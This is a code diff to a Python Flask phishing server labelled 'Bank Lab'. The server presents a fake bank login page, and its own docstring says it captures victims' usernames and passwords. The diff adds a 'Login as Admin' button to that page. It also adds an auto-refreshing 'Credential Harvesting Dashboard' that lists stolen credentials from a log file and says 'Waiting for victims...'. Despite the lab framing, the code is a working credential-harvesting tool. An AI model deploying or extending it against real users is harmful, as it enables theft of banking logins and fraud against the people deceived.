@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 """
 Simple Phishing Server for Bank Lab
-Captures usernames and passwords from victims
+Captures usernames and passwords from victims 
+
+last updated 12.48
 """
 
 from flask import Flask, request, render_template_string, redirect, url_for
@@ -122,6 +124,29 @@ LOGIN_PAGE = '''
             color: #28a745;
             font-size: 12px;
         }
+        
+        .admin-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+            margin-top: 15px;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+        }
+        
+        .admin-btn:hover {
+            transform: translateY(-1px);
+            text-decoration: none;
+            color: white;
+        }
     </style>
 </head>
 <body>
@@ -154,6 +179,8 @@ LOGIN_PAGE = '''
             <span>🔐 SSL Secured</span>
             <span>✅ Trusted</span>
         </div>
+        
+        <a href="/admin" class="admin-btn">🔧 Login as Admin</a>
     </div>
 </body>
 </html>
@@ -273,17 +300,169 @@ def login():
 
 @app.route('/admin')
 def admin():
-    """Admin page to view captured credentials"""
+    """Simple admin page to view captured credentials"""
     try:
         with open('/data/creds.log', 'r') as f:
             logs = f.read()
         
-        if not logs:
-            logs = "No credentials captured yet."
+        # Parse log entries for simple display
+        entries = []
+        if logs:
+            for line in logs.strip().split('\n'):
+                if 'CAPTURED' in line:
+                    entries.append(line)
         
-        return f"<pre>{logs}</pre>"
+        # Simple HTML admin page
+        admin_html = f'''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Panel - Bank Lab</title>
+    <style>
+        body {{
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }}
+        .container {{
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }}
+        .header {{
+            background: #dc3545;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+            margin-bottom: 20px;
+        }}
+        .stats {{
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+        }}
+        .stat-box {{
+            background: #007bff;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            flex: 1;
+            text-align: center;
+        }}
+        .stat-number {{
+            font-size: 24px;
+            font-weight: bold;
+        }}
+        .entry {{
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 10px;
+        }}
+        .timestamp {{
+            color: #6c757d;
+            font-size: 12px;
+        }}
+        .credentials {{
+            color: #dc3545;
+            font-weight: bold;
+            font-family: monospace;
+        }}
+        .refresh-btn {{
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }}
+        .no-data {{
+            text-align: center;
+            color: #6c757d;
+            padding: 40px;
+        }}
+    </style>
+    <script>
+        function refreshPage() {{
+            location.reload();
+        }}
+        // Auto refresh every 5 seconds
+        setTimeout(refreshPage, 5000);
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🕷️ Admin Panel - Bank Lab</h1>
+            <p>Credential Harvesting Dashboard</p>
+        </div>
+        
+        <button class="refresh-btn" onclick="refreshPage()">🔄 Refresh</button>
+        
+        <div class="stats">
+            <div class="stat-box">
+                <div class="stat-number">{len(entries)}</div>
+                <div>Total Captures</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">{datetime.datetime.now().strftime("%H:%M:%S")}</div>
+                <div>Current Time</div>
+            </div>
+        </div>
+        
+        <h3>📋 Captured Credentials:</h3>
+'''
+        
+        if entries:
+            for entry in reversed(entries):  # Show newest first
+                admin_html += f'''
+        <div class="entry">
+            <div class="timestamp">{entry}</div>
+        </div>
+'''
+        else:
+            admin_html += '''
+        <div class="no-data">
+            <h3>🎯 No credentials captured yet</h3>
+            <p>Waiting for victims...</p>
+        </div>
+'''
+        
+        admin_html += '''
+    </div>
+</body>
+</html>
+'''
+        
+        return admin_html
+        
     except FileNotFoundError:
-        return "No credentials captured yet."
+        return '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Panel - Bank Lab</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 50px; text-align: center; }
+        .container { background: white; padding: 40px; border-radius: 10px; max-width: 500px; margin: 0 auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🕷️ Admin Panel</h1>
+        <p>No credentials captured yet. Start the attack!</p>
+        <button onclick="location.reload()">🔄 Refresh</button>
+    </div>
+</body>
+</html>
+'''
 
 if __name__ == '__main__':
     print("🚀 Starting Bank Lab Phishing Server...")
